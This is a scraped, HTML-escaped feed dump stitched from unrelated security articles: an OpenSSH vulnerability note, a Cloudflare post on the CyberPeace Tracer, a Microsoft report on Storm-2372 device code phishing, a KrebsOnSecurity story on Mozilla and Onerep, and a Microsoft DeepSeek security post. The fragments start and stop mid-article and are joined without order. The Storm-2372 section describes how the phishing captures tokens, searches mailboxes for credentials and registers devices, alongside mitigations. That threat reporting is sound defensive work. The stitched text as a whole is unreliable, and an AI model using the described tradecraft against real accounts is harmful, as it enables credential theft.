&lt;p&gt;OpenSSH 9.9p2 addresses the vulnerabilities mentioned above. Upgrade promptly to maintain security.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="potential-impact"&gt;&lt;strong&gt;Potential Impact&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;If an attacker can perform a man-in-the-middle attack via CVE-2025-26465, the client may accept the attacker’s key instead of the legitimate server’s key. This would break the integrity of the SSH connection, enabling potential interception or tampering with the session before the user even realizes it. SSH sessions can be a prime target for attackers aiming to intercept credentials or hijack sessions. If compromised, hackers could view or manipulate sensitive data, move across multiple critical servers laterally, and exfiltrate valuable information such as database credentials. Such breaches can lead to reputational damage, violate compliance mandates (e.g., GDPR, HIPAA, PCI-DSS), and potentially disrupt critical operations by forcing system downtime to contain the threat.&lt;/p&gt;



&lt;p&gt;SSH is a critical service for remote system administration. If attackers can repeatedly exploit the flaw CVE-2025-26466, they may cause prolonged outages or prevent administrators from managing servers, effectively locking legitimate users out. An enterprise facing this vulnerability could see critical servers become unreachable, interrupting routine operations and stalling essential maintenance tasks.&lt;/p&gt;



&lt;p&gt;When the Qualys research team confirmed the vulnerability, Qualys initiated a responsible disclosure process and worked with OpenSSH to coordinate its announcement.&lt;/p&gt;

These organizations play a large role in delivering services during crises, whether it is &lt;a href="https://www.cloudflare.com/case-studies/awaq-ongd/"&gt;&lt;u&gt;fighting climate change&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://www.cloudflare.com/case-studies/valdosta-amateur-radio-club/"&gt;&lt;u&gt;support during natural disasters&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://www.cloudflare.com/case-studies/hera-digital-health/"&gt;&lt;u&gt;providing health services to marginalized communities&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://www.cloudflare.com/project-galileo-case-studies/"&gt;&lt;u&gt;more. &lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;What do many of these organizations have in common? Many times, it’s cyber attacks from adversaries looking to steal sensitive information or disrupt their operations. Cloudflare has seen this firsthand when providing free cybersecurity services to vulnerable groups through programs like &lt;a href="https://www.cloudflare.com/galileo/"&gt;&lt;u&gt;Project Galileo,&lt;/u&gt;&lt;/a&gt; and found that in aggregate, organizations protected under the project experience an average of 95 million attacks per day. While cyber attacks are a problem across all industries in the digital age, civil society organizations are disproportionately targeted, many times due to their advocacy, and because attackers know that they typically operate with limited resources. In most cases, these organizations don’t even know they have been attacked until it is too late. &lt;/p&gt;&lt;p&gt;Over the last 10 years of Project Galileo, we’ve had the opportunity to work more closely with leading civil society organizations. This has led to a number of exciting new partnerships, including our work with the &lt;a href="https://cyberpeaceinstitute.org/"&gt;&lt;u&gt;CyberPeace Institute&lt;/u&gt;&lt;/a&gt;. That’s why we’re excited to share work on a new resource, the &lt;a href="https://cyberpeacetracer.ngo/"&gt;&lt;u&gt;CyberPeace Tracer&lt;/u&gt;&lt;/a&gt;. This resource will enable researchers, civil society, governments, and other organizations to understand threats and data-driven insights about the cyber threat landscape of the vulnerable communities we serve.&lt;/p&gt;
          &lt;div&gt;

          &lt;/figure&gt;&lt;p&gt;The CyberPeace Institute is an independent non-profit based in Switzerland, dedicated to making cyberspace safer and more equitable for everyone. The Institute works closely with partners to minimize the impact of cyberattacks on people’s lives worldwide. In addition to partnerships, the organization provides independent &lt;a href="https://cyberpeaceinstitute.org/cyber-incident-tracers/"&gt;&lt;u&gt;data-driven insights on the threat landscape&lt;/u&gt;&lt;/a&gt;, from the global healthcare system to cyber attacks during the Russian government's invasion of Ukraine. By analyzing these attacks, they are able to highlight real-world consequences, expose violations of international laws and norms, and promote responsible behavior online.&lt;/p&gt;&lt;p&gt;Cloudflare's work with the CyberPeace Institute started in 2022 when the organization joined Project Galileo.Through the program, Cloudflare was proud not only to help protect the CyberPeace website, but also provide &lt;a href="https://blog.cloudflare.com/democratizing-access-to-zero-trust-with-project-galileo/"&gt;&lt;u&gt;Zero Trust tools&lt;/u&gt;&lt;/a&gt; that secure access to internal applications for the institute's global workforce. In addition to participating in Project Galileo, CyberPeace has also joined as an official partner, alongside more than 53 civil society organizations that help us identify organizations in need of protection.&lt;/p&gt;&lt;p&gt;As the CyberPeace Institute helped us grow Project Galileo, they also tested out new features including &lt;a href="https://developers.cloudflare.com/email-security/"&gt;&lt;u&gt;Cloudflare Email Security&lt;/u&gt;&lt;/a&gt;, a Cloudflare product designed to help protect against phishing and ransomware attacks. Testing the product for their organizations, they found that our approach to proactively detect and block malicious email, and ease of deployment with no need for hardware or extra software, would benefit the wider community they serve. With this in mind, CyberPeace came to us with an idea: they saw the potential to extend Email Security to smaller organizations that don’t have the same technical tools or budget to protect themselves. &lt;/p&gt;&lt;p&gt;Through our unique partnership, the CyberPeace Institute onboards its network of NGOs with Cloudflare Email Security, serving as a central hub to aggregate real-time data on email threats. This information powers a live dashboard, providing other organizations with visibility into phishing campaigns that could impact the broader community. One key challenge in tracking targeted phishing attacks is that many incidents go unreported, or victims may not realize they have been compromised until much later. By having a partner serve as a centralized point of contact, it helps ensure that insights into phishing attempts at one NGO can help protect others before the attack spreads. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;CyberPeace Tracer&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#cyberpeace-tracer"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The &lt;a href="https://cyberpeacetracer.ngo/analysis"&gt;&lt;u&gt;CyberPeace Tracer &lt;/u&gt;&lt;/a&gt;shares vulnerabilities and threats faced by the community of NGOs, developed by the CyberPeace Institute. The CyberPeace Tracer gathers and analyzes data on cyberattacks and disinformation campaigns targeting NGOs, non-profits, and charities that address global societal challenges. The goal is to better understand the scale and impact of these threats to inform the public, so that organizations can become aware of emerging threats and take action to improve their defenses.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3TvamEbkKLmzwwRmGBSfyO/e9538a60967b4384e184c437206b081e/image3.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;For the Tracer, CyberPeace partners and collects data directly from partners who monitor a predefined set of NGO domains. The dashboards detail publicly disclosed software and hardware vulnerabilities that can be exploited against monitor NGOs, malware infections detected, and analysis of phishing attacks that reveal trends and attacker tactics. The Tracer breaks out incidents by sector, including organizations working in health, development, food, water, energy, human rights, women’s rights and more. On the &lt;a href="https://cyberpeacetracer.ngo/analysis/phishing-threats"&gt;&lt;u&gt;phishing dashboard&lt;/u&gt;&lt;/a&gt;, users can filter by country, identify the top phishing subject lines that NGOs received, as well as the top five threats that were blocked by the Email Security product. &lt;/p&gt;&lt;p&gt;Our collaboration with CyberPeace strengthens defenses against phishing by allowing the CyberPeace Institute to analyze flagged emails, helping to identify and disrupt malicious domains and ongoing threats. By analyzing past incidents, we have found that organizations can learn from others’ experiences and implement best practices to reduce the likelihood of future attacks and data breaches, especially in a sector where many times, attacks go unreported. &lt;/p&gt;
          &lt;div&gt;

            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;This is an exciting development for strengthening reporting on cyber attacks to non-profits, enabling them to collaborate on solutions, share threat intelligence, and build stronger defenses across the sector.

&lt;p&gt;&lt;strong&gt;UPDATE (February 14, 2025)&lt;/strong&gt;: Within the past 24 hours, Microsoft has observed Storm-2372 shifting to using the specific client ID for Microsoft Authentication Broker in the device code sign-in flow. &lt;a href="https://www.microsoft.com/en-us/security/blog/feed/#Update-February-14"&gt;More details below&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Executive summary&lt;/strong&gt;:&lt;/p&gt;



&lt;p&gt;Today we’re sharing that Microsoft discovered cyberattacks being launched by a group we call Storm-2372, who we assess with medium confidence aligns with Russia’s interests and tradecraft. The attacks appear to have been ongoing since August 2024 and have targeted governments, NGOs, and a wide range of industries in multiple regions. The attacks use a specific phishing technique called “device code phishing” that tricks users to log into productivity apps while Storm-2372 actors capture the information from the log in (tokens) that they can use to then access compromised accounts. These tokens are part of an industry standard and, while these phishing lures used Microsoft and other apps to trick users, they do not reflect an attack unique to Microsoft nor have we found any vulnerabilities in our code base enabling this activity.&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;Microsoft Threat Intelligence Center discovered an active and successful device code phishing campaign by a threat actor we track as Storm-2372. Our ongoing investigation indicates that this campaign has been active since August 2024 with the actor creating lures that resemble messaging app experiences including WhatsApp, Signal, and Microsoft Teams. Storm-2372’s targets during this time have included government, non-governmental organizations (NGOs), information technology (IT) services and technology, defense, telecommunications, health, higher education, and energy/oil and gas in Europe, North America, Africa, and the Middle East. Microsoft assesses with medium confidence that Storm-2372 aligns with Russian interests, victimology, and tradecraft.&amp;nbsp;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;In device code phishing, threat actors exploit the device code authentication flow to capture authentication tokens, which they then use to access target accounts, and further gain access to data and other services that the compromised account has access to. This technique could enable persistent access as long as the tokens remain valid, making this attack technique attractive to threat actors.&lt;/p&gt;



&lt;p&gt;The phishing attack identified in this blog masquerades as Microsoft Teams meeting invitations delivered through email. When targets click the meeting invitation, they are prompted to authenticate using a threat actor-generated device code. The actor then receives the valid access token from the user interaction, stealing the authenticated session.&lt;/p&gt;



&lt;p&gt;Because of the active threat represented by Storm-2372 and other threat actors exploiting device code phishing techniques, we are sharing our latest research, detections, and mitigation guidance on this campaign to raise awareness of the observed tactics, techniques, and procedures (TTPs), educate organizations on how to harden their attack surfaces, and disrupt future operations by this threat actor. Microsoft uses Storm designations as a temporary name given to an unknown, emerging, or developing cluster of threat activity, allowing Microsoft to track it as a unique set of information until we reach high confidence about the origin or identity of the threat actor behind the activity.&lt;/p&gt;



&lt;p&gt;Microsoft Threat Intelligence Center continues to track campaigns launched by Storm-2372, and, when able, directly notifies customers who have been targeted or compromised, providing them with the necessary information to help secure their environments. Microsoft is also tracking other groups using similar techniques, including those documented by Volexity in their &lt;a href="https://www.volexity.com/blog/2025/02/13/multiple-russian-threat-actors-targeting-microsoft-device-code-authentication/"&gt;recent publication&lt;/a&gt;.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="how-does-device-code-phishing-work"&gt;How does device code phishing work?&lt;/h2&gt;



&lt;p&gt;A device code authentication flow is a numeric or alphanumeric code used to authenticate an account from an input-constrained device that does not have the ability to perform an interactive authentication using a web flow and thus must perform this authentication on another device to sign-in. In device code phishing, threat actors exploit the device code authentication flow.&lt;/p&gt;



&lt;p&gt;During the attack, the threat actor generates a legitimate device code request and tricks the target into entering it into a legitimate sign-in page. This grants the actor access and enables them to capture the authentication—access and refresh—tokens that are generated, then use those tokens to access the target’s accounts and data. The actor can also use these phished authentication tokens to gain access to other services where the user has permissions, such as email or cloud storage, without needing a password. The threat actor continues to have access so long as the tokens remain valid. The attacker can then use the valid access token to move laterally within the environment.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Diagram showing the device code phishing attack chain" class="wp-image-137469 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/02/Device-code-phishing-attack-chain.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1. Device code phishing attack cycle&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="storm-2372-phishing-lure-and-access"&gt;Storm-2372 phishing lure and access&lt;/h2&gt;



&lt;p&gt;Storm-2372’s device code phishing campaign has been active since August 2024. Observed early activity indicates that Storm-2372 likely targeted potential victims using third-party messaging services including WhatsApp, Signal, and Microsoft Teams, falsely posing as a prominent person relevant to the target to develop rapport before sending subsequent invitations to online events or meetings via phishing emails.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshots of Signal messages from threat actor" class="wp-image-137475 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/02/Signal-1.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2. Sample messages from the threat actor posing as a prominent person and building rapport on Signal&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;The invitations lure the user into completing a device code authentication request emulating the experience of the messaging service, which provides Storm-2372 initial access to victim accounts and enables Graph API data collection activities, such as email harvesting.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of Microsoft Teams lure" class="wp-image-137471 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/02/Fig2.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3. Example of lure used in phishing campaign&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;On the device code authentication page, the user is tricked into entering the code that the threat actor included as the ID for the fake Teams meeting invitation.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="post-compromise-activity"&gt;Post-compromise activity&lt;/h2&gt;



&lt;p&gt;Once the victim uses the device code to authenticate, the threat actor receives the valid access token. The threat actor then uses this valid session to move laterally within the newly compromised network by sending additional phishing messages containing links for device code authentication to other users through intra-organizational emails originating from the victim’s account.&lt;/p&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of device code authentication page" class="wp-image-137472 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/02/Fig3.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4. Legitimate device code authentication page&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;Additionally, Microsoft observed Storm-2372 using Microsoft Graph to search through messages of the account they’ve compromised. The threat actor was using keyword searching to view messages containing words such as username, password, admin, teamviewer, anydesk, credentials, secret, ministry, and gov. Microsoft then observed email exfiltration via Microsoft Graph of the emails found from these searches.&lt;/p&gt;



&lt;p id="Update-February-14"&gt;&lt;strong&gt;February 14, 2025 update&lt;/strong&gt;: &lt;/p&gt;



&lt;p&gt;Within the past 24 hours, Microsoft has observed Storm-2372 shifting to using the specific client ID for Microsoft Authentication Broker in the device code sign-in flow. Using this client ID enables Storm-2372 to receive a refresh token that can be used to request another token for the device registration service, and then register an actor-controlled device within Entra ID. With the same refresh token and the new device identity, Storm-2372 is able to obtain a Primary Refresh Token (PRT) and access an organization’s resources. We have observed Storm-2372 using the connected device to collect emails.&lt;/p&gt;



&lt;p&gt;The actor has also been observed to use proxies that are regionally appropriate for the targets, likely in an attempt to further conceal the suspicious sign in activity.&lt;/p&gt;



&lt;p&gt;While many of the mitigations and queries listed below still apply in this scenario, alerts involving anomalous token or PRT activity surrounding close-in-time device registrations may also be a useful method for identifying this shift in technique. Additionally, &lt;a href="https://learn.microsoft.com/en-us/entra/identity/devices/manage-device-identities#configure-device-settings"&gt;enrollment restrictions&lt;/a&gt; – limiting the user permissions that can enroll devices into your Microsoft Entra ID environment – can also help to address this attack behavior.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="attribution"&gt;Attribution&lt;/h2&gt;



&lt;p&gt;The actor that Microsoft tracks as Storm-2372 is a suspected nation-state actor working toward Russian state interests. It notably has used device code phishing to compromise targets of interest. Storm-2372 likely initially approaches targets through third-party messaging services, posing as a prominent individual relevant to the target to develop rapport before sending invites to online events or meetings. These invites lure the user into device code authentication that grants initial access to Storm-2372 and enables Graph API data collection activities such as email harvesting.&lt;/p&gt;



&lt;p&gt;Storm-2372 targets include government, NGOs, IT services and technology, defense, telecommunications, health, higher education, and energy/oil and gas in Europe, North America, Africa, and the Middle East.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="mitigation-and-protection-guidance"&gt;Mitigation and protection guidance&lt;/h2&gt;



&lt;p&gt;To harden networks against the Storm-2372 activity described above, defenders can implement the following:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Only allow device code flow where necessary. Microsoft recommends &lt;a href="https://learn.microsoft.com/entra/identity/conditional-access/policy-block-authentication-flows"&gt;blocking device code flow wherever possible&lt;/a&gt;. Where necessary, configure Microsoft Entra ID’s &lt;a href="https://learn.microsoft.com/entra/identity/conditional-access/concept-authentication-flows"&gt;device code flow&lt;/a&gt; in your Conditional Access policies.&lt;/li&gt;



&lt;li&gt;Educate users about common phishing techniques. Sign-in prompts should clearly identify the application being authenticated to. As of 2021, Microsoft Azure interactions prompt the user to confirm (“Cancel” or “Continue”) that they are signing in to the app they expect, which is an option frequently missing from phishing sign-ins.&lt;/li&gt;



&lt;li&gt;If suspected Storm-2372 or other device code phishing activity is identified, &lt;a href="https://learn.microsoft.com/graph/api/user-revokesigninsessions"&gt;revoke the user&amp;#8217;s refresh tokens by calling &lt;em&gt;revokeSignInSessions&lt;/em&gt;&lt;/a&gt;. Consider &lt;a href="https://learn.microsoft.com/entra/identity/conditional-access/policy-all-users-persistent-browser#create-a-conditional-access-policy"&gt;setting a Conditional Access Policy to force re-authentication&lt;/a&gt; for users.&lt;/li&gt;



&lt;li&gt;&lt;a href="https://learn.microsoft.com/azure/active-directory/identity-protection/howto-identity-protection-configure-risk-policies"&gt;Implement a sign-in risk policy&lt;/a&gt;&amp;nbsp;to automate response to risky sign-ins. A sign-in risk represents the probability that a given authentication request isn&amp;#8217;t authorized by the identity owner. A sign-in risk-based policy can be implemented by adding a sign-in risk condition to Conditional Access policies that evaluates the risk level of a specific user or group. Based on the risk level (high/medium/low), a policy can be configured to block access or force multi-factor authentication.
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;When a user is a high risk and &lt;a href="https://learn.microsoft.com/entra/identity/conditional-access/concept-continuous-access-evaluation"&gt;Conditional access evaluation is enabled&lt;/a&gt;, the user’s access is revoked, and they are forced to re-authenticate.&lt;/li&gt;



&lt;li&gt;For regular activity monitoring, use &lt;a href="https://portal.azure.com/#view/Microsoft_AAD_IAM/SecurityMenuBlade/~/RiskySignIns"&gt;Risky sign-in reports&lt;/a&gt;, which&amp;nbsp;surface attempted and successful user access activities where the legitimate owner might not have performed the sign-in.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The following best practices further help improve organizational defenses against phishing and other credential theft attacks:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Require&amp;nbsp;&lt;a href="https://learn.microsoft.com/microsoft-365/admin/security-and-compliance/set-up-multi-factor-authentication"&gt;multifactor authentication (MFA)&lt;/a&gt;. While certain attacks such as device code phishing attempt to evade MFA, implementation of MFA remains an essential pillar in identity security and is highly effective at stopping a variety of threats.
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Leverage&amp;nbsp;&lt;a href="https://learn.microsoft.com/entra/identity/authentication/concept-authentication-methods"&gt;phishing-resistant authentication methods&lt;/a&gt;&amp;nbsp;such as FIDO Tokens, or&amp;nbsp;&lt;a href="https://www.microsoft.com/security/mobile-authenticator-app"&gt;Microsoft Authenticator&lt;/a&gt;&amp;nbsp;with passkey. Avoid telephony-based MFA methods to avoid risks associated with SIM-jacking.&lt;/li&gt;



&lt;li&gt;Block&amp;nbsp;&lt;a href="https://learn.microsoft.com/entra/identity/conditional-access/block-legacy-authentication"&gt;legacy authentication with Microsoft Entra by using Conditional Access&lt;/a&gt;. Legacy authentication protocols do not have the ability to enforce MFA, as legacy MFA (per-user MFA prompts) is susceptible to abuse.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;



&lt;li&gt;Centralize your organization’s identity management into a single platform. If your organization is a hybrid environment, integrate your on-premises directories with your cloud directories. If your organization is using a third-party for identity management, ensure this data is being logged in a SIEM or connected to Microsoft Entra to fully monitor for malicious identity access from a centralized location. The added benefits to centralizing all identity data is to facilitate implementation of&amp;nbsp;&lt;a href="https://learn.microsoft.com/azure/active-directory/manage-apps/plan-sso-deployment"&gt;Single Sign On (SSO)&lt;/a&gt;&amp;nbsp;and provide users with a more seamless authentication process, as well as configure Entra ID’s machine learning models to operate on all identity data, thus learning the difference between legitimate access and malicious access quicker and easier. It is recommended to&amp;nbsp;&lt;a href="https://learn.microsoft.com/azure/active-directory/hybrid/connect/how-to-connect-password-hash-synchronization"&gt;synchronize all user accounts&lt;/a&gt;&amp;nbsp;except administrative and high privileged ones when doing this to maintain a boundary between the on-premises environment and the cloud environment, in case of a breach.&lt;/li&gt;



&lt;li&gt;&lt;a href="https://learn.microsoft.com/en-us/entra/architecture/security-operations-introduction"&gt;Secure accounts with credential hygiene&lt;/a&gt;: practice the&amp;nbsp;&lt;a href="https://learn.microsoft.com/azure/active-directory/roles/delegate-by-task"&gt;principle of least privilege&lt;/a&gt;&amp;nbsp;and audit privileged account activity in your Entra ID environments to slow and stop attackers.&lt;/li&gt;
&lt;/ul&gt;

Shortly after that investigation was published, &lt;strong&gt;Mozilla&lt;/strong&gt; said it would stop bundling Onerep with the &lt;strong&gt;Firefox&lt;/strong&gt; browser and wind down its partnership with the company. But nearly a year later, Mozilla is still promoting it to Firefox users.&lt;/p&gt;
&lt;p&gt;Mozilla offers Onerep to Firefox users on a subscription basis as part of &lt;a href="https://www.mozilla.org/en-US/about/legal/terms/subscription-services/" rel="noopener" target="_blank"&gt;Mozilla Monitor Plus&lt;/a&gt;. Launched in 2018 under the name &lt;a href="https://en.wikipedia.org/wiki/Firefox_Monitor" rel="noopener" target="_blank"&gt;Firefox Monitor&lt;/a&gt;, Mozilla Monitor also checks data from the website &lt;a href="https://haveibeenpwned.com/" rel="noopener" target="_blank"&gt;Have I Been Pwned?&lt;/a&gt; to let users know when their email addresses or password are leaked in data breaches.&lt;/p&gt;
&lt;p&gt;The ink on that partnership agreement had barely dried before KrebsOnSecurity &lt;a href="https://krebsonsecurity.com/2024/03/ceo-of-data-privacy-company-onerep-com-founded-dozens-of-people-search-firms/" rel="noopener" target="_blank"&gt;published a story&lt;/a&gt; showing that Onerep’s Belarusian CEO and founder &lt;strong&gt;Dimitiri Shelest&lt;/strong&gt; launched dozens of people-search services since 2010, including a still-active data broker called &lt;strong&gt;Nuwber&lt;/strong&gt; that sells background reports on people. This seemed to contradict Onerep&amp;#8217;s stated motto, &amp;#8220;We believe that no one should compromise personal online security and get a profit from it.”&lt;/p&gt;
&lt;p&gt;Shelest released &lt;a href="https://krebsonsecurity.com/wp-content/uploads/2024/03/Dimitri-Shelest-Letter-_-Comment-on-Krebs-article-3.20.24-1.pdf" rel="noopener" target="_blank"&gt;a lengthy statement&lt;/a&gt; (PDF) wherein he acknowledged maintaining an ownership stake in &lt;strong&gt;Nuwber&lt;/strong&gt;, a consumer data broker he founded in 2015 — around the same time he started Onerep.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_66783" style="width: 760px;"&gt;&lt;img alt="" class=" wp-image-66783" height="439" src="https://krebsonsecurity.com/wp-content/uploads/2024/03/onerep-shellest.png" width="750" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-66783"&gt;Onerep.com CEO and founder Dimitri Shelest, as pictured on the &amp;#8220;about&amp;#8221; page of onerep.com.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Shelest maintained that Nuwber has “zero cross-over or information-sharing with Onerep,” and said any other old domains that may be found and associated with his name are no longer being operated by him.&lt;/p&gt;
&lt;p&gt;“I get it,” Shelest wrote. “My affiliation with a people search business may look odd from the outside. In truth, if I hadn’t taken that initial path with a deep dive into how people search sites work, Onerep wouldn’t have the best tech and team in the space. Still, I now appreciate that we did not make this more clear in the past and I’m aiming to do better in the future.”&lt;/p&gt;
&lt;p&gt;When asked to comment on the findings, Mozilla said then that although customer data was never at risk, the outside financial interests and activities of Onerep&amp;#8217;s CEO did not align with their values.&lt;/p&gt;
&lt;p&gt;&amp;#8220;We&amp;#8217;re working now to solidify a transition plan that will provide customers with a seamless experience and will continue to put their interests first,&amp;#8221; Mozilla &lt;a href="https://krebsonsecurity.com/2024/03/mozilla-drops-onerep-after-ceo-admits-to-running-people-search-networks/" rel="noopener" target="_blank"&gt;said&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In October 2024, Mozilla published a statement saying the search for a different provider was taking longer than anticipated.&lt;/p&gt;
&lt;p&gt;&amp;#8220;While we continue to evaluate vendors, finding a technically excellent and values-aligned partner takes time,&amp;#8221; Mozilla &lt;a href="https://support.mozilla.org/en-US/kb/securing-new-partner-monitor-plus" rel="noopener" target="_blank"&gt;wrote&lt;/a&gt;. &amp;#8220;While we continue this search, Onerep will remain the backend provider, ensuring that we can maintain uninterrupted services while we continue evaluating new potential partners that align more closely with Mozilla’s values and user expectations. We are conducting thorough diligence to find the right vendor.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Asked for an update, Mozilla said the search for a replacement partner continues.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The work’s ongoing but we haven’t found the right alternative yet,&amp;#8221; Mozilla said in an emailed statement. &amp;#8220;Our customers’ data remains safe, and since the product provides a lot of value to our subscribers, we’ll continue to offer it during this process.”&lt;/p&gt;
&lt;p&gt;It&amp;#8217;s a win-win for Mozilla that they&amp;#8217;ve received accolades for their principled response while continuing to partner with Onerep almost a year later. But if it takes so long to find a suitable replacement, what does that say about the personal data removal industry itself?&lt;span id="more-70392"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Onerep appears to be working in partnership with another problematic people-search service: &lt;strong&gt;Radaris&lt;/strong&gt;, which has a history of ignoring opt-out requests or failing to honor them. A week before breaking the story about Onerep, KrebsOnSecurity &lt;a href="https://krebsonsecurity.com/2024/03/a-close-up-look-at-the-consumer-data-broker-radaris/" rel="noopener" target="_blank"&gt;published research&lt;/a&gt; showing the co-founders of Radaris were two native Russian brothers who&amp;#8217;d built a vast network of affiliate marketing programs and consumer data broker services.&lt;/p&gt;
&lt;p&gt;Lawyers for the Radaris co-founders threatened to sue KrebsOnSecurity unless that story was retracted in full, claiming the founders were in fact Ukrainian and that our reporting had defamed the brothers by associating them with the actions of Radaris. Instead, we published &lt;a href="https://krebsonsecurity.com/2024/06/krebsonsecurity-threatened-with-defamation-lawsuit-over-fake-radaris-ceo/" rel="noopener" target="_blank"&gt;a follow-up investigation&lt;/a&gt; which showed that not only did the brothers from Russia create Radaris, for many years they issued press releases quoting a fictitious CEO seeking money from investors.&lt;/p&gt;
&lt;p&gt;Several readers have shared emails they received from Radaris after attempting to remove their personal data, and those messages show Radaris has been promoting Onerep.&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/02/13/securing-deepseek-and-other-ai-systems-with-microsoft-security/"&gt;Securing DeepSeek and other AI systems with Microsoft Security&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;A successful AI transformation starts with a strong security foundation. With a rapid increase in AI development and adoption, organizations need visibility into their emerging AI apps and tools. Microsoft Security provides threat protection, posture management, data security, compliance, and governance to secure AI applications that you build and use. These capabilities can also be used to help enterprises secure and govern AI apps built with the DeepSeek R1 model and gain visibility and control over the use of the seperate DeepSeek consumer app.&amp;nbsp;&lt;/p&gt;

&lt;h3 class="wp-block-heading" id="develop-with-trustworthy-ai"&gt;Develop with trustworthy AI&amp;nbsp;&lt;/h3&gt;



&lt;p&gt;Last week, we announced &lt;a href="https://azure.microsoft.com/en-us/blog/deepseek-r1-is-now-available-on-azure-ai-foundry-and-github/" rel="noreferrer noopener" target="_blank"&gt;DeepSeek R1&amp;#8217;s availability on Azure AI Foundry and GitHub&lt;/a&gt;, joining a diverse portfolio of more than 1,800 models.&amp;nbsp; &amp;nbsp;&lt;/p&gt;



&lt;p&gt;Customers today are building production-ready AI applications with Azure AI Foundry, while accounting for their varying security, safety, and privacy requirements. Similar to other models provided in Azure AI Foundry, DeepSeek R1 has undergone rigorous red teaming and safety evaluations, including automated assessments of model behavior and extensive security reviews to mitigate potential risks.&amp;nbsp;Microsoft’s hosting safeguards for AI models are designed to keep customer data within Azure’s secure boundaries.&amp;nbsp;&lt;/p&gt;

&lt;/div&gt;



&lt;p&gt;With Azure AI Content Safety, built-in content filtering is available by default to help detect and block malicious, harmful, or ungrounded content, with opt-out options for flexibility. Additionally, the safety evaluation system allows customers to efficiently test their applications before deployment. These safeguards help Azure AI Foundry provide a secure, compliant, and responsible environment for enterprises to confidently build and deploy AI solutions. See &lt;a href="https://azure.microsoft.com/en-us/blog/deepseek-r1-is-now-available-on-azure-ai-foundry-and-github/" rel="noreferrer noopener" target="_blank"&gt;Azure AI Foundry and GitHub&lt;/a&gt; for more details.&lt;/p&gt;

	&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;AI workloads introduce new cyberattack surfaces and vulnerabilities, especially when developers leverage open-source resources. Therefore, it&amp;#8217;s critical to start with security posture management, to discover all AI inventories, such as models, orchestrators, grounding data sources, and the direct and indirect risks around these components. When developers build AI workloads with DeepSeek R1 or other AI models, &lt;a href="https://www.microsoft.com/security/business/cloud-security/microsoft-defender-cloud" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;Microsoft Defender for Cloud&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;’s AI security posture management capabilities&lt;/strong&gt; can help security teams gain visibility into AI workloads, discover AI cyberattack surfaces and vulnerabilities, detect cyberattack paths that can be exploited by bad actors, and get recommendations to proactively strengthen their security posture against cyberthreats.&lt;/p&gt;


&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="AI security posture management in Defender for Cloud identifies an attack path to a DeepSeek R1 workload, where an Azure virtual machine is exposed to the Internet." class="wp-image-137417 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/02/SPM-Blog-Image-final-1024x551.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 1. AI security posture management in Defender for Cloud detects an attack path to a DeepSeek R1 workload&lt;/em&gt;.&lt;/figcaption&gt;&lt;/figure&gt;



